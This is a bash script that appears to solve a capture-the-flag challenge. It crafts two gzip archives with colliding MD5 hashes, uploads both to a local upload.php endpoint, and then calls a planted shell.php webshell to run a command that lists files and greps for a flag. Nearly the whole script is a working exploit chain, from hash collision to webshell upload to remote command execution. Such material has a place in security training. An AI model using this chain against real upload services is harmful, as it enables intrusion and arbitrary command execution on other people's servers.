#!/bin/bash
set -euo pipefail
cd "$(dirname -- "$( readlink -f -- "$0"; )")"

BASE_URL="http://localhost:8080"

# Compress websites
(cd website1; tar -czf ../website1.tgz *)
(cd website2; tar -czf ../website2.tgz *)

# Generate archives with hash collision
# https://github.com/corkami/collisions?tab=readme-ov-file#gzip
MD5SUM=$(python3 gz.py website1.tgz website2.tgz)
mv coll-1.gz website1.tgz
mv coll-2.gz website2.tgz
trap "rm website1.tgz website2.tgz" EXIT

# Validate hashes
echo "[*] Validating collision hash '${MD5SUM}' ..."
echo -e "${MD5SUM} website1.tgz\n${MD5SUM} website2.tgz" | \
  md5sum -c - | \
  while read line; do echo " [+] $line"; done

# Upload both websites
echo "[*] Uploading websites ..."
if curl -s -XPOST -F website=@website1.tgz "${BASE_URL}/upload.php" | grep "Exit code 0" >/dev/null; then
  echo " [+] Uploaded first website"
else
  echo " [!] Failed uploading first website"
  exit 1
fi
if curl -s -XPOST -F website=@website2.tgz "${BASE_URL}/upload.php" | grep "Exit code 0" >/dev/null; then
  echo " [+] Uploaded second website"
else
  echo " [!] Failed uploading second website"
  exit 1
fi

# Execute command on server using webshell
echo "[*] Executing command 'ls -1 ../.. | grep flag' on server ..."
echo -n " [+] "
curl -s -XGET "${BASE_URL}/websites/${MD5SUM}/shell.php?command=ls%20-1%20..%2F..%20%7C%20grep%20flag" | \
  tr '\n' '\r' | \
  sed -re 's#.*<pre>(.*?)</pre>.*#\1#g' | \
  tr '\r' '\n'
